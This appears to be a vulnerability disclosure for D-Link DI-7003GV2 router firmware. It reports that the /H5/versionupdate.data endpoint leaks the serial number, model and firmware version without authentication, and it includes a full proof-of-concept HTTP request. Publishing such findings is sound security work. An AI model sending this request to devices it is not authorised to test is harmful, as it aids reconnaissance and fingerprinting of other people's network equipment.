# Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：http://www.dlink.com.cn/techsupport/download.ashx?file=7828

# Affected version

DI-7003GV2-24.04.18D1 R(68125)

# Vulnerability description

The D-Link DI-7003GV2 firmware version 24.04.18D1 R(68125) contains an information disclosure vulnerability in the `/H5/versionupdate.data` endpoint. Remote attackers can access this interface without authentication to retrieve sensitive device information, including the serial number and firmware version. 


# Vulnerability details

The handling function for the `H5/versionupdate.data` interface is `sub_48F4F0`.

![图 1](img/34a0c13315857cd887824e59751b4b1a7aabcfe3c0eda429b87274e2099f3d71.png)  

The `sub_48F4F0` function retrieves sensitive information such as firmware version and device model and outputs it to the user, and it returns a JSON formatted response.

![图 2](img/ed5d337780675379d9ce8b2df4a50bf3313ca31830e9dbb290f1f470721de40a.png)  


# Poc


```http
GET /H5/versionupdate.data HTTP/1.1
Host: 192.168.140.240
Content-Length: 0
Cache-Control: max-age=0
Origin: http://192.168.140.240
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.140.240/login.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
```

![图 0](img/0435bab0b9f42c029774e1266b78c99180b8e49d6decbf0086ae7e6be7f810c2.png)  
